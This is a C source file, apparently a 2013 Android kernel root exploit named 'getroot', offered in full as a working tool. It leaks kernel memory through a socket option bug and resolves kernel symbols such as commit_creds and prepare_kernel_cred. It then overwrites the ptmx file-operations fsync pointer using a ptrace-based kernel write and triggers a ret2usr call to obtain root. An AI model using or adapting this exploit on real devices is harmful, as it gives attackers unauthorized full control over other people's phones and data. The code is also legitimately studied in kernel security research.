/* getroot 2013/12/07 */

/*
 * Copyright (C) 2013 CUBE
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#define KERNEL_START_ADDRESS 0xffffffc000080000UL
#define KERNEL_SIZE 0x2000000
#define SEARCH_START_ADDRESS 0xffffffc000a54a00UL
//#define SEARCH_START_ADDRESS 0xffffffc000623800UL
#define KALLSYMS_SIZE 0x200000
#define EXECCOMMAND "/system/bin/sh"

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/system_properties.h>

#define PTMX_DEVICE "/dev/ptmx"

unsigned long *kallsymsmem = NULL;

unsigned long pattern_kallsyms_addresses[] = {
    0xffffffc000080000UL, /* _text */
    0xffffffc000080040UL, /* stext */
    0xffffffc000080080UL  /* el2_setup */
};
unsigned long kallsyms_num_syms;
unsigned long *kallsyms_addresses;
unsigned char *kallsyms_names;
unsigned char *kallsyms_token_table;
unsigned short *kallsyms_token_index;
unsigned long *kallsyms_markers;

unsigned long prepare_kernel_cred_address = 0;
unsigned long commit_creds_address = 0;
unsigned long ptmx_fops_address = 0;

unsigned long ptmx_open_address = 0;
unsigned long tty_init_dev_address = 0;
unsigned long tty_release_address = 0;
unsigned long tty_fasync_address = 0;
unsigned long ptm_driver_address = 0;

struct cred;
struct task_struct;

struct cred *(*prepare_kernel_cred)(struct task_struct *);
int (*commit_creds)(struct cred *);

bool bChiled;


int read_value_at_address(unsigned long address, unsigned long *value) {
    int sock;
    int ret;
    int i;
    unsigned long addr = address;
    unsigned char *pval = (unsigned char *)value;
    socklen_t optlen = 1;

    *value = 0;
    errno = 0;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        fprintf(stderr, "socket() failed: %s.\n", strerror(errno));
        return -1;
    }

    for (i = 0; i < sizeof(*value); i++, addr++, pval++) {
        errno = 0;
        ret = setsockopt(sock, SOL_IP, IP_TTL, (void *)addr, 1);
        if (ret != 0) {
            if (errno != EINVAL) {
                fprintf(stderr, "setsockopt() failed: %s.\n", strerror(errno));
                close(sock);
                *value = 0;
                return -1;
            }
        }
        errno = 0;
        optlen = 1;
        ret = getsockopt(sock, SOL_IP, IP_TTL, pval, &optlen);
        if (ret != 0) {
            fprintf(stderr, "getsockopt() failed: %s.\n", strerror(errno));
            close(sock);
            *value = 0;
            return -1;
        }
    }

    close(sock);

    return 0;
}

unsigned long *kerneldump(unsigned long startaddr, unsigned long dumpsize) {
    unsigned long addr;
    unsigned long val;
    unsigned long *allocaddr;
    unsigned long *memaddr;
    int cnt, num, divsize;

    printf("kernel dump...\n");
    allocaddr = (unsigned long *)malloc(dumpsize);
    if (allocaddr == NULL) {
        fprintf(stderr, "malloc failed: %s.\n", strerror(errno));
        return NULL;
    }
    memaddr = allocaddr;

    cnt = 0;
    num = 0;
    divsize = dumpsize / 10;
    for (addr = startaddr; addr < (startaddr + dumpsize); addr += 8, memaddr++) {
        if (read_value_at_address(addr, &val) != 0) {
            printf("\n");
            fprintf(stderr, "kerneldump failed: %s.\n", strerror(errno));
            return NULL;
        }
        *memaddr = val;
        cnt += 8;
        if (cnt >= divsize) {
            cnt = 0;
            num++;
            printf("%d ", num);
            fflush(stdout);
        }
    }

    printf("\n");
    return allocaddr;
}

int check_pattern(unsigned long *addr, unsigned long *pattern, int patternnum) {
    unsigned long val;
    unsigned long cnt;
    unsigned long i;

    read_value_at_address((unsigned long)addr, &val);
    if (val == pattern[0]) {
        cnt = 1;
        for (i = 1; i < patternnum; i++) {
            read_value_at_address((unsigned long)(&addr[i]), &val);
            if (val == pattern[i]) {
                cnt++;
            } else {
                break;
            }
        }
        if (cnt == patternnum) {
            return 0;
        }
    }

    return -1;
}

int check_kallsyms_header(unsigned long *addr) {
    if (check_pattern(addr, pattern_kallsyms_addresses, sizeof(pattern_kallsyms_addresses) / sizeof(addr)) == 0) {
        return 0;
    }

    return -1;
}

int get_kallsyms_addresses() {
    unsigned long *endaddr;
    unsigned long i, j;
    unsigned long *addr;
    unsigned long n;
    unsigned long val = 0;
    unsigned long off;
    int cnt, num;

    if (read_value_at_address(KERNEL_START_ADDRESS + 0x38, &val) != 0) {
        fprintf(stderr, "this device is not supported.\n");
        return -1;
    }
    printf("magic = %lx\n", val);
    printf("search kallsyms...\n");
    endaddr = (unsigned long *)(KERNEL_START_ADDRESS + KERNEL_SIZE);
    cnt = 0;
    num = 0;
    for (i = 0; i < (KERNEL_START_ADDRESS + KERNEL_SIZE - SEARCH_START_ADDRESS); i += 16) {
        for (j = 0; j < 2; j++) {
            cnt += 8;
            if (cnt >= 0x10000) {
                cnt = 0;
                num++;
                printf("%d ", num);
                fflush(stdout);
            }

            /* get kallsyms_addresses pointer */
            if (j == 0) {
                kallsyms_addresses = (unsigned long *)(SEARCH_START_ADDRESS + i);
            } else {
                if ((i == 0) || ((SEARCH_START_ADDRESS - i) < KERNEL_START_ADDRESS)) {
                    continue;
                }
                kallsyms_addresses = (unsigned long *)(SEARCH_START_ADDRESS - i);
            }
            if (check_kallsyms_header(kallsyms_addresses) != 0) {
                continue;
            }
            addr = kallsyms_addresses;
            off = 0;

            /* search end of kallsyms_addresses */
            n = 0;
            while (1) {
                read_value_at_address((unsigned long)addr, &val);
                if (val < KERNEL_START_ADDRESS) {
                    break;
                }
                n++;
                addr++;
                off++;
                if (addr >= endaddr) {
                    return -1;
                }
            }

            /* skip there is filled by 0x0 */
            while (1) {
                read_value_at_address((unsigned long)addr, &val);
                if (val != 0) {
                    break;
                }
                addr++;
                off++;
                if (addr >= endaddr) {
                    return -1;
                }
            }

            read_value_at_address((unsigned long)addr, &val);
            kallsyms_num_syms = val;
            addr++;
            off++;
            if (addr >= endaddr) {
                return -1;
            }

            /* check kallsyms_num_syms */
            if (kallsyms_num_syms != n) {
                continue;
            }

            if (num > 0) {
                printf("\n");
            }
            printf("(kallsyms_addresses=%lx)\n", (unsigned long)kallsyms_addresses);
            printf("(kallsyms_num_syms=%lx)\n", kallsyms_num_syms);
            kallsymsmem = kerneldump((unsigned long)kallsyms_addresses, KALLSYMS_SIZE);
            if (kallsymsmem == NULL) {
                return -1;
            }
            endaddr = (unsigned long *)((unsigned long)kallsymsmem + KALLSYMS_SIZE);

            addr = &kallsymsmem[off];

            /* skip there is filled by 0x0 */
            while (addr[0] == 0x0) {
                addr++;
                if (addr >= endaddr) {
                    return -1;
                }
            }

            kallsyms_names = (unsigned char *)addr;
            printf("(kallsyms_names=%lx)\n", ((unsigned long)addr - (unsigned long)kallsymsmem + (unsigned long)kallsyms_addresses));

            /* search end of kallsyms_names */
            for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
                int len = kallsyms_names[off];
                off += len + 1;
                if (&kallsyms_names[off] >= (unsigned char *)endaddr) {
                    return -1;
                }
            }

            /* adjust */
            addr = (unsigned long *)((((unsigned long)&kallsyms_names[off] - 1) | 0x7) + 1);
            if (addr >= endaddr) {
                return -1;
            }

            /* skip there is filled by 0x0 */
            while (addr[0] == 0x0) {
                addr++;
                if (addr >= endaddr) {
                    return -1;
                }
            }
            /* but kallsyms_markers shoud be start 0x00000000 */
            addr--;

            kallsyms_markers = addr;
            printf("(kallsyms_markers=%lx)\n", ((unsigned long)addr - (unsigned long)kallsymsmem + (unsigned long)kallsyms_addresses));

            /* end of kallsyms_markers */
            addr = &kallsyms_markers[((kallsyms_num_syms - 1) >> 8) + 1];
            if (addr >= endaddr) {
                return -1;
            }

            /* skip there is filled by 0x0 */
            while (addr[0] == 0x0) {
                addr++;
                if (addr >= endaddr) {
                    return -1;
                }
            }

            kallsyms_token_table = (unsigned char *)addr;
            printf("(kallsyms_token_table=%lx)\n", ((unsigned long)addr - (unsigned long)kallsymsmem + (unsigned long)kallsyms_addresses));

            i = 0;
            while ((kallsyms_token_table[i] != 0x00) || (kallsyms_token_table[i + 1] != 0x00)) {
                i++;
                if (&kallsyms_token_table[i - 1] >= (unsigned char *)endaddr) {
                    return -1;
                }
            }

            /* skip there is filled by 0x0 */
            while (kallsyms_token_table[i] == 0x00) {
                i++;
                if (&kallsyms_token_table[i - 1] >= (unsigned char *)endaddr) {
                    return -1;
                }
            }

            /* but kallsyms_markers shoud be start 0x0000 */
            kallsyms_token_index = (unsigned short *)&kallsyms_token_table[i - 2];
            kallsyms_addresses = kallsymsmem;

            return 0;
        }
    }

    if (num > 0) {
        printf("\n");
    }
    return -1;
}

unsigned long kallsyms_expand_symbol(unsigned long off, char *namebuf) {
    int len;
    int skipped_first;
    unsigned char *tptr;
    unsigned char *data;

    /* Get the compressed symbol length from the first symbol byte. */
    data = &kallsyms_names[off];
    len = *data;
    off += len + 1;
    data++;

    skipped_first = 0;
    while (len > 0) {
        tptr = &kallsyms_token_table[kallsyms_token_index[*data]];
        data++;
        len--;

        while (*tptr > 0) {
            if (skipped_first != 0) {
                *namebuf = *tptr;
                namebuf++;
            } else {
                skipped_first = 1;
            }
            tptr++;
        }
    }
    *namebuf = '\0';

    return off;
}

int search_functions() {
    char namebuf[1024];
    unsigned long i;
    unsigned long off;
    int cnt;

    cnt = 0;
    for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
        off = kallsyms_expand_symbol(off, namebuf);
        //printf("sym = %s\n", namebuf);
        if (strcmp(namebuf, "prepare_kernel_cred") == 0) {
            printf("prepare_kernel_cred @ %ld\n", i);
            prepare_kernel_cred_address = kallsyms_addresses[i];
            cnt++;
        } else if (strcmp(namebuf, "commit_creds") == 0) {
            printf("commit_creds @ %ld\n", i);
            commit_creds_address = kallsyms_addresses[i];
            cnt++;
        } else if (strcmp(namebuf, "ptmx_open") == 0) {
            printf("ptmx_open @ %ld\n", i);
            ptmx_open_address = kallsyms_addresses[i];
            cnt++;
        } else if (strcmp(namebuf, "tty_init_dev") == 0) {
            printf("tty_init_dev @ %ld\n", i);
            tty_init_dev_address = kallsyms_addresses[i];
            cnt++;
        } else if (strcmp(namebuf, "tty_release") == 0) {
            printf("tty_release @ %ld\n", i);
            tty_release_address = kallsyms_addresses[i];
            cnt++;
        } else if (strcmp(namebuf, "tty_fasync") == 0) {
            printf("tty_fasync @ %ld\n", i);
            tty_fasync_address = kallsyms_addresses[i];
            cnt++;
        } else if (strcmp(namebuf, "ptmx_fops") == 0) {
            printf("ptmx_fops @ %ld\n", i);
            ptmx_fops_address = kallsyms_addresses[i];
        }
    }

    if (cnt < 6) {
        return -1;
    }

    return 0;
}

void analyze_ptmx_open() {
    unsigned long i, j, k;
    unsigned long addr;
    unsigned long val;
    unsigned long regnum;
    unsigned long data_addr;

    printf("analyze ptmx_open...\n");
    for (i = 0; i < 0x200; i += 4) {
        addr = ptmx_open_address + i;
        read_value_at_address(addr, &val);
        if ((val & 0xfc000000) == 0x94000000) {
            if (((((tty_init_dev_address / 4) - (addr / 4)) >> 2) & 0x03ffffff) == (val & 0x03ffffff)) {
                for (j = 1; j <= i; j++) {
                    addr = ptmx_open_address + i - j;
                    read_value_at_address(addr, &val);
                    if ((val & 0xfff0f000) == 0xe5900000) {
                        regnum = (val & 0x000f0000) >> 16;
                        for (k = 1; k <= (i - j); k++) {
                            addr = ptmx_open_address + i - j - k;
                            read_value_at_address(addr, &val);
                            if ((val & 0xfffff000) == (0xe59f0000 + (regnum << 12))) {
                                data_addr = addr + (val & 0x00000fff) + 8;
                                read_value_at_address(data_addr, &val);
                                ptm_driver_address = val;
                                return;
                            }
                        }
                    }
                }
            }
        }
    }

    return;
}

unsigned long search_ptmx_fops_address() {
    unsigned long *addr;
    unsigned long range;
    unsigned long *ptmx_fops_open;
    unsigned long i;
    unsigned long val, val2, val5;
    int cnt, num;

    printf("search ptmx_fops...\n");
    if (ptm_driver_address != 0) {
        addr = (unsigned long *)ptm_driver_address;
    } else {
        addr = (unsigned long *)(kallsyms_addresses[kallsyms_num_syms - 1]);
    }
    addr++;
    ptmx_fops_open = NULL;
    range = ((KERNEL_START_ADDRESS + KERNEL_SIZE) - (unsigned long)addr) / sizeof(unsigned long);
    cnt = 0;
    num = 0;
    for (i = 0; i < range - 14; i++) {
        read_value_at_address((unsigned long)(&addr[i]), &val);
        if (val == ptmx_open_address) {
            read_value_at_address((unsigned long)(&addr[i + 2]), &val2);
            if (val2 == tty_release_address) {
                read_value_at_address((unsigned long)(&addr[i + 5]), &val5);
                if (val5 == tty_fasync_address) {
                    ptmx_fops_open = &addr[i];
                    break;
                }
            }
        }
        cnt += 4;
        if (cnt >= 0x10000) {
            cnt = 0;
            num++;
            printf("%d ", num);
            fflush(stdout);
        }
    }

    if (num > 0) {
        printf("\n");
    }
    if (ptmx_fops_open == NULL) {
        return 0;
    }
    return ((unsigned long)ptmx_fops_open - 0x58);
}

int get_addresses() {
    if (get_kallsyms_addresses() != 0) {
        if (kallsymsmem != NULL) {
            free(kallsymsmem);
            kallsymsmem = NULL;
        }
        fprintf(stderr, "kallsyms_addresses search failed.\n");
        return -1;
    }

    if (search_functions() != 0) {
        if (kallsymsmem != NULL) {
            free(kallsymsmem);
            kallsymsmem = NULL;
        }
        fprintf(stderr, "search_functions failed.\n");
        return -1;
    }

    if (ptmx_fops_address == 0) {
        analyze_ptmx_open();
        ptmx_fops_address = search_ptmx_fops_address();
        if (ptmx_fops_address == 0) {
            if (kallsymsmem != NULL) {
                free(kallsymsmem);
                kallsymsmem = NULL;
            }
            fprintf(stderr, "search_ptmx_fops_address failed.\n");
            return -1;
        }
    }

    if (kallsymsmem != NULL) {
        free(kallsymsmem);
        kallsymsmem = NULL;
    }

    printf("\n");
    printf("prepare_kernel_cred=%lx\n", prepare_kernel_cred_address);
    printf("commit_creds=%lx\n", commit_creds_address);
    printf("ptmx_fops=%lx\n", ptmx_fops_address);
    printf("\n");

    return 0;
}

void obtain_root_privilege(void) {
    commit_creds(prepare_kernel_cred(0));
}

static bool run_obtain_root_privilege(void *user_data) {
    int fd;

    printf("trigger ret2usr\n");
    fd = open(PTMX_DEVICE, O_WRONLY);
    fsync(fd);
    close(fd);

    return true;
}

void ptrace_write_values_at_address(unsigned long address, void *value) {
    pid_t pid;
    long ret;
    int status;

    bChiled = false;
    pid = fork();
    if (pid < 0) {
        printf("failed to fork\n");
        return;
    }
    if (pid == 0) {
        ret = ptrace(PTRACE_TRACEME, 0, 0, 0);
        if (ret < 0) {
            fprintf(stderr, "PTRACE_TRACEME failed\n");
        }
        bChiled = true;
        signal(SIGSTOP, SIG_IGN);
        kill(getpid(), SIGSTOP);
        exit(EXIT_SUCCESS);
    }

    do {
        ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &bChiled, &bChiled);
    } while (!bChiled);

    ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &value, (void *)address);
    if (ret < 0) {
        fprintf(stderr, "PTRACE_PEEKDATA failed: %s\n", strerror(errno));
    }

    kill(pid, SIGKILL);
    waitpid(pid, &status, WNOHANG);
}

bool ptrace_run_exploit(unsigned long address, void *value, bool (*exploit_callback)(void *user_data), void *user_data) {
    bool success;

    ptrace_write_values_at_address(address, value);
    success = exploit_callback(user_data);

    return success;
}

static bool run_exploit(void) {
    unsigned long int ptmx_fops_fsync_address;

    ptmx_fops_fsync_address = ptmx_fops_address + 0x70;
    return ptrace_run_exploit(ptmx_fops_fsync_address, &obtain_root_privilege, run_obtain_root_privilege, NULL);
}

int main(int argc, char **argv) {

    if (get_addresses() != 0) {
        exit(EXIT_FAILURE);
    }
    printf("Succeeded in get address\n");

    prepare_kernel_cred = (void *)prepare_kernel_cred_address;
    commit_creds = (void *)commit_creds_address;

    printf("uid = %d\n", getuid());

    run_exploit();

    if (getuid() != 0) {
        printf("Failed to getroot.\n");
        exit(EXIT_FAILURE);
    }

    printf("Succeeded in getroot!\n");
    printf("\n");

#if 0
    if (argc >= 2) {
        system(argv[1]);
    } else {
        system(EXECCOMMAND);
    }
#endif

    return 0;
}
